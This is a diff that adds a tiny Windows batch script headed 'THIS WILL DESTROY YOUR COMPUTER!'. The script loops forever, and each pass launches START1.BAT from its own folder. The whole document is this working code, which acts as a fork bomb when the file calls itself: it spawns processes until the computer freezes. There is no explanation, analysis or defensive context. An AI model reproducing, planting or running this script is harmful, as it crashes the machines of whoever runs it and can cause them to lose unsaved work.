@@ -1,0 +1,6 @@
+REM THIS WILL DESTROY YOUR COMPUTER!
+:1
+
+start %~dp0\START1.BAT
+
+goto 1
